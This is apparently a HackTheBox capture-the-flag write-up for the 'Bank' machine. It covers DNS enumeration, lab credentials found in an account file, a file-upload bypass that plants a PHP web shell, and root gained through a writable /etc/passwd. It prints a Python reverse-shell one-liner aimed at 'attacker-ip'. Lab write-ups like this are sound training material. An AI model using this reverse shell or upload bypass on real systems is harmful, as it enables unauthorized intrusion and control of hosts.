---
title: bank
date: 2020-12-03 14:05:05 +/-TTTT
categories: [CTF, hackthebox]
tags: [file upload, dns, passwd]
---

![infocard](/assets/htb/bank/infocard.png)

bank is an easy box in which we have to do some domain enumeration to find website hosted on box.  bypass file upload restriction to get a shell on box. privs escalation is easy we have to just modify a file.

## Enumeration

So let's dive in, as always we start with a Nmap scan.

```nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-04 01:10 EST
Nmap scan report for 10.10.10.29
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.98 seconds
```
Nmap shows that we have ssh, DNS, and webpage on the box. Let's start to enumerate the webpage. 

the webpage shows the default apache HTTP page. also, run gobuster but nothing interested found.

![webpage](/assets/htb/bank/webpage.png)

there is port 53 open so let's check for zone transfer.  there is no hint about host or domain lets try `bank.htb.`

![dig](/assets/htb/bank/dig.png)

we found `chris.bank.htb` `bank.htb` `ns.bank.htb` `www.bank.htb` . add them in `/etc/hosts` file.

chris.bank.htb ns.bank.htb and www.bank.htb redirected to default apache page. only bank.htb redirected to login page.

![login](/assets/htb/bank/login.png)

try to some default creds like admin:admin , admin:password, admin:bank, bank:bank but none of this work, also test for sqli but does not found sqli vulnerability.

Let's find out what directories are present using ffuf.

![dirscan](/assets/htb/bank/dirscan.png)

`uploads` return 403 forbidden, `assets` doesn't seem too interesting, `inc` has four PHP pages it also doesn't seem interesting.
`balance-transfer`  has a lot of `.acc` files which having encrypted username and password. but one file looks interesting because it has less size compare to all other files. and when I open it it has a plain text username and password for Chris.

```
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

## Gaining shell
using these creds log in to Chris's account. there is `support.php` which is tickets system and we can uploads files. try to upload PHP shell but it gives us an error that only image files can be uploaded. so I craft a file that has png mime type and PHP shell content and uploads it.

it accepts the file but the webserver does not treat it as a PHP file because of `.png` extension.

![fileupload](/assets/htb/bank/fileupload.png)

here I stuck for a while but after viewing the source code of the `support.php`  i found that it can accept `.htb` extension which executes as PHP code so create a new payload with `.htb` and upload it.

`<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->`

access the web shell in `bank.htb/uploads/test.htb`
got web-shell as `www-data`
 
![wwwshell](/assets/htb/bank/wwwshell.png)

used python to get reverse shell.

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker-ip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

in chris's home directory found a user flag.

![user](/assets/htb/bank/user.png)

## Getting root

while enumerating box for privs I found that we can write into `/etc/passwd` file. 
![passwd](/assets/htb/bank/passwd.png)

so it's easy to get root on the box. just create another user with root privs and got root access.

![root](/assets/htb/bank/root.png)